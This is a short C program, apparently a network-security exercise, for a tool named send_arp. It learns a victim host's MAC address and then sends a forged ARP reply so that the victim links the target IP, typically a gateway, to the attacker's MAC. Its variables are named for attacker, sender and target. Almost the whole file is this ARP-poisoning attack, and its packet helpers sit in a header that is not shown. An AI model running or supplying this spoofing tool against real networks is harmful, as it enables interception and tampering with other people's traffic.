#include <stdio.h>
#include <pcap.h>
#include "kmh_header.h"

void usage()
{
	printf("syntax : send_arp <interface> <send ip> <target ip>\n");
	printf("sample : send_arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[])
{
	if(argc != 4)
	{
		usage();
		return -1;
	}

	char *dev = argv[1];
	char buf[18];
	int i;

	struct in_addr AttackerIP, SenderIP, TargetIP;
	struct libnet_ether_addr AttackerHA, SenderHA, TargetHA;
	inet_pton(AF_INET, argv[2], &SenderIP);
	inet_pton(AF_INET, argv[3], &TargetIP);

	GetLocalIP(&AttackerIP, dev);
	GetLocalHA(&AttackerHA, dev);

	printf("Local IP : %s\n", inet_ntoa(AttackerIP));
	printf("Local HA : %s\n", my_ether_ntoa(&AttackerHA, buf));

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if(handle == NULL)
	{
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}
	
	printf("\nSend ARP Request...\n");
	SendARPRequest(handle, &AttackerIP, &SenderIP, &AttackerHA);
	GetTargetHA(handle, &AttackerIP, &SenderIP, &AttackerHA, &SenderHA);
	printf("Sender HA : %s\n", my_ether_ntoa(&SenderHA, buf));
	
	// ARP reply
	printf("\nSend ARP Reply...\n");
	SendARPReply(handle, &TargetIP, &SenderIP, &AttackerHA, &SenderHA);
	printf("Done!\n");

	pcap_close(handle);
	
	return 0;
}
